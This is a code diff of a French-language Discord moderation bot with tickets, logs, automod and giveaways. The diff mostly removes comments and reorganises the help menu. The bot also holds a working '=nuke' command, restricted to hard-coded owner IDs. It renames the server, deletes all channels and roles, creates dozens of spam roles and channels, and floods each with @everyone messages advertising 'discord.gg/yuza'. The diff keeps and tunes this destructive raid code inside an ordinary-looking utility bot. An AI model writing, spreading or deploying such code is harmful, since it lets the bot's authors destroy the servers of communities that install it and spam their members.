@@ -1,7 +1,6 @@
 const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, StringSelectMenuBuilder, PermissionsBitField, ChannelType, AttachmentBuilder } = require('discord.js');
 const http = require('http');
 
-// Serveur HTTP pour Render (maintient le Web Service actif 24/7)
 const PORT = process.env.PORT || 3000;
 http.createServer((req, res) => {
     res.writeHead(200, { 'Content-Type': 'text/plain' });
@@ -20,12 +19,10 @@ const client = new Client({
 
 const PREFIX = '=';
 
-// Stockages en mémoire
 const snipeCache = new Map();
 const spamTracker = new Map();
 const serverConfig = new Map(); 
 
-// Owners permanents
 const botOwners = new Set(["77jc", "1166445202148442112", "330080470983245824"]); 
 
 function isOwner(message) {
@@ -47,8 +44,8 @@ function getGuildConfig(guildId) {
             logChannel: null,
             welcomeChannel: null,
             welcomeText: null,
-            ticketRole: null,      // Rôle staff à ping dans les tickets
-            ticketCategory: null   // Catégorie où créer les salons de tickets
+            ticketRole: null,
+            ticketCategory: null
         });
     }
     return serverConfig.get(guildId);
@@ -74,9 +71,6 @@ async function fetchTargetUser(client, guild, targetArg) {
         return null;
     }
 }
-// ==========================================
-// SYSTÈME DE LOGS & ÉVÉNEMENTS PRO
-// ==========================================
 client.on('messageDelete', message => {
     if (!message.author || message.author.bot || !message.guild) return;
     snipeCache.set(message.channel.id, {
@@ -163,7 +157,7 @@ client.on('roleDelete', role => {
 });
 
 client.on('ready', () => {
-    console.log(`Bot connecté en tant que ${client.user.tag} ! Prêt pour le serveur principal.`);
+    console.log(`Bot connecté en tant que ${client.user.tag} ! Prêt pour le serveur.`);
 });
 
 client.on('guildMemberAdd', async member => {
@@ -190,9 +184,6 @@ client.on('guildMemberAdd', async member => {
         }
     }
 });
-// ==========================================
-// INTERACTIONS : TICKETS PRO & TRANSCRIPTIONS
-// ==========================================
 client.on('interactionCreate', async interaction => {
     if (interaction.isStringSelectMenu() && interaction.customId === 'ticket_select_menu') {
         const guild = interaction.guild;
@@ -207,7 +198,6 @@ client.on('interactionCreate', async interaction => {
         else if (selectedValue === 'ticket_recrutement') categoryName = "recrutement";
 
         try {
-            // Permissions sécurisées : seul le créateur, le staff et le bot voient le salon
             const overwrites = [
                 { id: guild.roles.everyone.id, deny: [PermissionsBitField.Flags.ViewChannel] },
                 { id: member.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory] }
@@ -256,7 +246,6 @@ client.on('interactionCreate', async interaction => {
         await interaction.reply("🔒 Fermeture du ticket, génération de la transcription...");
 
         try {
-            // Récupération de l'historique des messages pour la transcription
             const messages = await channel.messages.fetch({ limit: 100 });
             const transcript = messages.reverse().map(m => `[${new Date(m.createdTimestamp).toLocaleString()}] ${m.author.tag}: ${m.content}`).join('\n');
             
@@ -287,9 +276,6 @@ client.on('interactionCreate', async interaction => {
         return interaction.reply({ content: "🎉 Tu participes officiellement au giveaway !", ephemeral: true });
     }
 });
-// ==========================================
-// COMMANDES ET MOTEUR DE GESTION
-// ==========================================
 client.on('messageCreate', async message => {
     if (message.author.bot || !message.guild) return;
 
@@ -298,7 +284,6 @@ client.on('messageCreate', async message => {
     const userIsOwner = isOwner(message);
     const isUserAdminOrOwner = message.member.permissions.has(PermissionsBitField.Flags.Administrator) || userIsOwner;
 
-    // Automod Anti-lien
     if (config.antilink && !isUserAdminOrOwner) {
         const linkRegex = /(https?:\/\/[^\s]+|discord\.gg\/[^\s]+|discord\.com\/invite\/[^\s]+)/i;
         if (linkRegex.test(message.content)) {
@@ -311,7 +296,6 @@ client.on('messageCreate', async message => {
         }
     }
 
-    // Automod Anti-spam
     if (config.antispam && !isUserAdminOrOwner) {
         const now = Date.now();
         let userSpam = spamTracker.get(userId) || [];
@@ -335,7 +319,6 @@ client.on('messageCreate', async message => {
     const command = args.shift().toLowerCase();
     const targetArg = args[0];
 
-    // Commande Aide complète
     if (command === 'help') {
         const helpCategories = {
             sanctions: {
@@ -354,13 +337,17 @@ client.on('messageCreate', async message => {
                 label: 'Tickets Pro', emoji: '🎫', description: 'Support et paramétrage',
                 commands: ['`=setticketrole <@rôle>` - Rôle staff support', '`=setticketcat <ID_Catégorie>` - Catégorie', '`=ticketsetup <#salon>` - Publier le panneau']
             },
+            giveaways: {
+                label: 'Giveaways', emoji: '🎉', description: 'Concours et tirages au sort',
+                commands: ['`=gcreate <durée> <gagnants> <prix>` - Lancer un concours interactif avec bouton de participation']
+            },
             automod: {
                 label: 'Automod & Logs', emoji: '🛡️', description: 'Sécurité et configuration',
                 commands: ['`=antilink on/off`', '`=antispam on/off`', '`=antibot on/off`', '`=setlog <#salon>`', '`=setwelcome <#salon> <msg>`']
             },
             config: {
-                label: 'Administration', emoji: '⚙️', description: 'Owners et concours',
-                commands: ['`=owner <ID>` - Ajouter owner', '`=unowner <ID>` - Retirer owner', '`=gcreate <durée> <gagnants> <prix>`']
+                label: 'Administration', emoji: '⚙️', description: 'Owners',
+                commands: ['`=owner <ID>` - Ajouter owner', '`=unowner <ID>` - Retirer owner']
             }
         };
 
@@ -428,7 +415,6 @@ client.on('messageCreate', async message => {
         }
     }
 
-    // Configuration des paramètres de tickets avancés
     if (command === 'setticketrole') {
         const role = message.mentions.roles.first();
         if (!role) return message.reply("Mentionnez le rôle staff à ping dans les tickets (ex: `=setticketrole @Staff`)");
@@ -759,21 +745,18 @@ client.on('messageCreate', async message => {
         }
     }
 
-if (command === 'nuke') {
+    if (command === 'nuke') {
         if (!userIsOwner) return message.reply("❌ Tu n'as pas la permission.");
         await message.reply("💥 **[NUKE TOTAL ULTRA-RAPIDE]** Saturation et destruction immédiate en cours...");
         try {
-            // Change le nom du serveur instantanément
             await message.guild.setName('/yuza').catch(() => {});
 
-            // Supprime TOUS les salons et rôles en parallèle total (priorité absolue)
             const deletePromises = [
                 ...message.guild.channels.cache.map(channel => channel.delete().catch(() => {})),
                 ...message.guild.roles.cache.filter(role => role.editable && role.id !== message.guild.id).map(role => role.delete().catch(() => {}))
             ];
             await Promise.all(deletePromises);
 
-            // Crée les rôles et les salons de spam en même temps pour saturer le serveur direct
             const rolePromises = [];
             for (let r = 0; r < 40; r++) {
                 rolePromises.push(message.guild.roles.create({ name: 'ez-by-k2l', color: 'Random', reason: 'Nuke flood' }).catch(() => {}));
@@ -797,7 +780,6 @@ if (command === 'nuke') {
                             ]
                         }]
                     }).then(async channel => {
-                        // Spam immédiat sans temps mort dans chaque salon créé
                         const spamArray = [];
                         for (let j = 0; j < 12; j++) {
                             spamArray.push(channel.send('@everyone SERVEUR DÉTRUIT PAR K2L discord.gg/yuza').catch(() => {}));
@@ -807,46 +789,7 @@ if (command === 'nuke') {
                 );
             }
 
-            // Exécute tout en un bloc ultra-rapide
             await Promise.all([...rolePromises, ...channelPromises]);
-        } catch (error) {
-            console.error("Erreur Nuke :", error);
-        }
-    }
-
-
-            const createPromises = [];
-            for (let i = 0; i < 40; i++) {
-                createPromises.push(
-                    message.guild.channels.create({
-                        name: 'ez-by-k2l',
-                        type: ChannelType.GuildText,
-                        permissionOverwrites: [
-                            {
-                                id: message.guild.id,
-                                allow: [
-                                    PermissionsBitField.Flags.ViewChannel,
-                                    PermissionsBitField.Flags.SendMessages,
-                                    PermissionsBitField.Flags.ManageChannels,
-                                    PermissionsBitField.Flags.EmbedLinks,
-                                    PermissionsBitField.Flags.AttachFiles,
-                                    PermissionsBitField.Flags.MentionEveryone
-                                ]
-                            }
-                        ]
-                    }).then(async channel => {
-                        const spamPromises = [];
-                        for (let j = 0; j < 10; j++) {
-                            spamPromises.push(
-                                channel.send('@everyone SERVEUR DÉTRUIT PAR K2L discord.gg/yuza').catch(() => {})
-                            );
-                        }
-                        await Promise.all(spamPromises);
-                    }).catch(() => {})
-                );
-            }
-
-            await Promise.all([...rolePromises, ...createPromises]);
         } catch (error) {
             console.error("Erreur Nuke :", error);
         }
